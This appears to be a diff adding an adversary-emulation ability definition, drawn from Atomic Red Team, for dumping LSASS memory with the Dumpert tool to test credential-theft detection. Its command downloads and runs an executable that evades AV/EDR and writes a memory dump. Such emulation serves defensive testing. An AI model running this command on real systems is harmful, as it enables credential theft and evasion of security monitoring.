@@ -1,0 +1,59 @@
+- id: 7ae7102c-a099-45c8-b985-4c7a2d05790d
+  name: Dump LSASS.exe Memory using direct system calls and API unhooking
+  description: "The memory of lsass.exe is often dumped for offline credential theft\
+    \ attacks. This can be achieved using direct system calls and API unhooking in\
+    \ an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\n\
+    Upon successful execution, you should see the following file created C:\\\\windows\\\
+    \\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find\
+    \ the path specified.\\\", try using the  get-prereq_commands to download the\
+    \  tool first."
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe")
+          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; New-Item -ItemType Directory (Split-Path
+          "PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe") -Force |
+          Out-Null; Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe";
+          fi; "PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe"'
+        cleanup: del C:\windows\temp\dumpert.dmp >nul 2> nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1003.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      dumpert_exe:
+        description: Path of Dumpert executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe
+    dependencies:
+    - description: 'Dumpert executable must exist on disk at specified location (#{dumpert_exe})
+
+        '
+      prereq_command: 'if (Test-Path "#{dumpert_exe}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+        New-Item -ItemType Directory (Split-Path "#{dumpert_exe}") -Force | Out-Null
+
+        Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"
+        -OutFile "#{dumpert_exe}"
+
+        '
+    technique_created: '2020-02-11T18:41:44.783Z'
+    atomic_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
+    import_timestamp: '2025-06-24T11:15:06.539404Z'
